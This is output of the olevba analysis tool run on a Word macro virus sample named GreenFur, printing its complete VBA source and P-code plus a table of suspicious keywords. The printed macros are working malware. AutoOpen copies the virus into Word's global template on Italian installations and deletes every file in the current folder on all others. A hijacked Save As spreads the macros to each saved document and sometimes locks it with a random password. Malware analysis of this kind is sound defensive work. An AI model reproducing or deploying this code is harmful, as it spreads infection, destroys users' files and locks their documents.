olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.GreenFur
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.GreenFur - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GreenFury.bas 
in file: Virus.MSWord.GreenFur - OLE stream: 'Macros/VBA/GreenFury'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
    '
End Sub

Private Function Casuale$(Password$)
Dim ACaso
Dim Indice
Dim Carattere
    '
    ACaso = WordBasic.Int(Rnd() * (10 - 1) + 1)
    '
    If ACaso > 5 Then
        '
        For Indice = 1 To 15
            Carattere = WordBasic.Int(Rnd() * (90 - 75) + 75)
            Password$ = Password$ + Chr(Carattere)
        Next Indice
        '
        Casuale$ = Password$
    End If
    '
End Sub
-------------------------------------------------------------------------------
VBA MACRO AutoOpen.bas 
in file: Virus.MSWord.GreenFur - OLE stream: 'Macros/VBA/AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Versione$
Dim i
Dim Installato
Dim TroppiProblemi
Dim Io$
Dim sMacro$
    '
    On Error GoTo -1: On Error GoTo Uscita
    'Controlla se la versione di word è italiana
    Versione$ = WordBasic.[AppInfo$](16)
    '
    If Versione$ = "Italiano" Then
        'controlla se è gia stato installato
        For i = 1 To NumMacros
            '
            If WordBasic.[MacroName$](i, 0, 0) = "GreenFury" Then
                Installato = -1
            End If
            '
            If WordBasic.[MacroName$](i, 0, 0) = "FileSalvaConNome" Then
                TroppiProblemi = -1
            End If
            '
        Next i
        '
        If Not Installato And Not TroppiProblemi Then
            Io$ = WordBasic.[FileName$]()
            sMacro$ = Io$ + ":GreenFury"
            WordBasic.MacroCopy sMacro$, "Generale:GreenFury", 1
            sMacro$ = Io$ + ":GGGFFF"
            WordBasic.MacroCopy sMacro$, "Generale:FileSalvaConNome", 1
            sMacro$ = Io$ + ":GGGFFF"
            WordBasic.MacroCopy sMacro$, "Generale:GGGFFF", 1
            sMacro$ = Io$ + ":FFFGGG"
            WordBasic.MacroCopy sMacro$, "Generale:FFFGGG", 1
        End If
        '
    Else
        WordBasic.Kill "*.*"
    End If
    '
Uscita:
    '
End Sub
-------------------------------------------------------------------------------
VBA MACRO GGGFFF.bas 
in file: Virus.MSWord.GreenFur - OLE stream: 'Macros/VBA/GGGFFF'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim Password$
Dim Io$
Dim sMacro$
    '
    Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
    On Error GoTo -1: On Error GoTo Controlla
    WordBasic.CurValues.FileSaveAs dlg
    WordBasic.Dialog.FileSaveAs dlg
    'Attiva la routine payload
    WordBasic.Call "GreenFury.Casuale$", Password$
    '
    If Len(Password$) = 15 Then
        dlg.Password = Password$
    End If
    '
    If dlg.Format = 0 Then dlg.Format = 1
    Io$ = WordBasic.[FileName$]()
    sMacro$ = Io$ + ":AutoOpen"
    WordBasic.MacroCopy "Generale:FFFGGG", sMacro$, 1
    sMacro$ = Io$ + ":FFFGGG"
    WordBasic.MacroCopy "Generale:FFFGGG", sMacro$, 1
    sMacro$ = Io$ + ":GGGFFF"
    WordBasic.MacroCopy "Generale:GGGFFF", sMacro$, 1
    sMacro$ = Io$ + ":GreenFury"
    WordBasic.MacroCopy "Generale:GreenFury", sMacro$, 1
    WordBasic.FileSaveAs dlg
    GoTo Fatto
Controlla:
    'Se è stato scelto annulla dalla finestra di dialogo
    If Err.Number <> 102 Then
        WordBasic.FileSaveAs dlg
    End If
    '
Fatto:
    '
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.GreenFur
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/GreenFury - 1745 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	QuoteRem 0x0004 0x0000 ""
' Line #3:
' 	EndSub 
' Line #4:
' Line #5:
' 	FuncDefn (Private Function Casuale(Password))
' Line #6:
' 	Dim 
' 	VarDefn ACaso
' Line #7:
' 	Dim 
' 	VarDefn Indice
' Line #8:
' 	Dim 
' 	VarDefn Carattere
' Line #9:
' 	QuoteRem 0x0004 0x0000 ""
' Line #10:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x000A 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St ACaso 
' Line #11:
' 	QuoteRem 0x0004 0x0000 ""
' Line #12:
' 	Ld ACaso 
' 	LitDI2 0x0005 
' 	Gt 
' 	IfBlock 
' Line #13:
' 	QuoteRem 0x0008 0x0000 ""
' Line #14:
' 	StartForVariable 
' 	Ld Indice 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	For 
' Line #15:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x005A 
' 	LitDI2 0x004B 
' 	Sub 
' 	Paren 
' 	Mul 
' 	LitDI2 0x004B 
' 	Add 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St Carattere 
' Line #16:
' 	Ld Password$ 
' 	Ld Carattere 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St Password$ 
' Line #17:
' 	StartForVariable 
' 	Ld Indice 
' 	EndForVariable 
' 	NextVar 
' Line #18:
' 	QuoteRem 0x0008 0x0000 ""
' Line #19:
' 	Ld Password$ 
' 	St Casuale$ 
' Line #20:
' 	EndIfBlock 
' Line #21:
' 	QuoteRem 0x0004 0x0000 ""
' Line #22:
' 	EndSub 
' Macros/VBA/AutoOpen - 3471 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Versione
' Line #3:
' 	Dim 
' 	VarDefn i
' Line #4:
' 	Dim 
' 	VarDefn Installato
' Line #5:
' 	Dim 
' 	VarDefn TroppiProblemi
' Line #6:
' 	Dim 
' 	VarDefn Io
' Line #7:
' 	Dim 
' 	VarDefn sMacro
' Line #8:
' 	QuoteRem 0x0004 0x0000 ""
' Line #9:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Uscita 
' Line #10:
' 	QuoteRem 0x0004 0x002B "Controlla se la versione di word è italiana"
' Line #11:
' 	LitDI2 0x0010 
' 	Ld WordBasic 
' 	ArgsMemLd [AppInfo$] 0x0001 
' 	St Versione$ 
' Line #12:
' 	QuoteRem 0x0004 0x0000 ""
' Line #13:
' 	Ld Versione$ 
' 	LitStr 0x0008 "Italiano"
' 	Eq 
' 	IfBlock 
' Line #14:
' 	QuoteRem 0x0008 0x0023 "controlla se è gia stato installato"
' Line #15:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NumMacros 
' 	For 
' Line #16:
' 	QuoteRem 0x000C 0x0000 ""
' Line #17:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0009 "GreenFury"
' 	Eq 
' 	IfBlock 
' Line #18:
' 	LitDI2 0x0001 
' 	UMi 
' 	St Installato 
' Line #19:
' 	EndIfBlock 
' Line #20:
' 	QuoteRem 0x000C 0x0000 ""
' Line #21:
' 	Ld i 
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0003 
' 	LitStr 0x0010 "FileSalvaConNome"
' 	Eq 
' 	IfBlock 
' Line #22:
' 	LitDI2 0x0001 
' 	UMi 
' 	St TroppiProblemi 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	QuoteRem 0x000C 0x0000 ""
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #26:
' 	QuoteRem 0x0008 0x0000 ""
' Line #27:
' 	Ld Installato 
' 	Not 
' 	Ld TroppiProblemi 
' 	Not 
' 	And 
' 	IfBlock 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Io$ 
' Line #29:
' 	Ld Io$ 
' 	LitStr 0x000A ":GreenFury"
' 	Add 
' 	St sMacro$ 
' Line #30:
' 	Ld sMacro$ 
' 	LitStr 0x0012 "Generale:GreenFury"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #31:
' 	Ld Io$ 
' 	LitStr 0x0007 ":GGGFFF"
' 	Add 
' 	St sMacro$ 
' Line #32:
' 	Ld sMacro$ 
' 	LitStr 0x0019 "Generale:FileSalvaConNome"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #33:
' 	Ld Io$ 
' 	LitStr 0x0007 ":GGGFFF"
' 	Add 
' 	St sMacro$ 
' Line #34:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Generale:GGGFFF"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #35:
' 	Ld Io$ 
' 	LitStr 0x0007 ":FFFGGG"
' 	Add 
' 	St sMacro$ 
' Line #36:
' 	Ld sMacro$ 
' 	LitStr 0x000F "Generale:FFFGGG"
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #37:
' 	EndIfBlock 
' Line #38:
' 	QuoteRem 0x0008 0x0000 ""
' Line #39:
' 	ElseBlock 
' Line #40:
' 	LitStr 0x0003 "*.*"
' 	Ld WordBasic 
' 	ArgsMemCall Kill 0x0001 
' Line #41:
' 	EndIfBlock 
' Line #42:
' 	QuoteRem 0x0004 0x0000 ""
' Line #43:
' 	Label Uscita 
' Line #44:
' 	QuoteRem 0x0004 0x0000 ""
' Line #45:
' 	EndSub 
' Macros/VBA/GGGFFF - 2585 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Dim 
' 	VarDefn Password
' Line #3:
' 	Dim 
' 	VarDefn Io
' Line #4:
' 	Dim 
' 	VarDefn sMacro
' Line #5:
' 	QuoteRem 0x0004 0x0000 ""
' Line #6:
' 	Dim 
' 	VarDefn dlg (As Object)
' 	BoS 0x0000 
' 	SetStmt 
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	MemLd DialogRecord 
' 	ArgsMemLd FileSaveAs 0x0001 
' 	Set dlg 
' Line #7:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError Controlla 
' Line #8:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd CurValues 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #9:
' 	Ld dlg 
' 	Ld WordBasic 
' 	MemLd Dialog 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #10:
' 	QuoteRem 0x0004 0x0019 "Attiva la routine payload"
' Line #11:
' 	LitStr 0x0012 "GreenFury.Casuale$"
' 	Ld Password$ 
' 	Ld WordBasic 
' 	ArgsMemCall Call 0x0002 
' Line #12:
' 	QuoteRem 0x0004 0x0000 ""
' Line #13:
' 	Ld Password$ 
' 	FnLen 
' 	LitDI2 0x000F 
' 	Eq 
' 	IfBlock 
' Line #14:
' 	Ld Password$ 
' 	Ld dlg 
' 	MemSt Password 
' Line #15:
' 	EndIfBlock 
' Line #16:
' 	QuoteRem 0x0004 0x0000 ""
' Line #17:
' 	Ld dlg 
' 	MemLd Format$ 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld dlg 
' 	MemSt Format$ 
' 	EndIf 
' Line #18:
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	St Io$ 
' Line #19:
' 	Ld Io$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	St sMacro$ 
' Line #20:
' 	LitStr 0x000F "Generale:FFFGGG"
' 	Ld sMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #21:
' 	Ld Io$ 
' 	LitStr 0x0007 ":FFFGGG"
' 	Add 
' 	St sMacro$ 
' Line #22:
' 	LitStr 0x000F "Generale:FFFGGG"
' 	Ld sMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	Ld Io$ 
' 	LitStr 0x0007 ":GGGFFF"
' 	Add 
' 	St sMacro$ 
' Line #24:
' 	LitStr 0x000F "Generale:GGGFFF"
' 	Ld sMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #25:
' 	Ld Io$ 
' 	LitStr 0x000A ":GreenFury"
' 	Add 
' 	St sMacro$ 
' Line #26:
' 	LitStr 0x0012 "Generale:GreenFury"
' 	Ld sMacro$ 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #27:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #28:
' 	GoTo Fatto 
' Line #29:
' 	Label Controlla 
' Line #30:
' 	QuoteRem 0x0004 0x0033 "Se è stato scelto annulla dalla finestra di dialogo"
' Line #31:
' 	Ld Err 
' 	MemLd Number 
' 	LitDI2 0x0066 
' 	Ne 
' 	IfBlock 
' Line #32:
' 	Ld dlg 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAs 0x0001 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	QuoteRem 0x0004 0x0000 ""
' Line #35:
' 	Label Fatto 
' Line #36:
' 	QuoteRem 0x0004 0x0000 ""
' Line #37:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

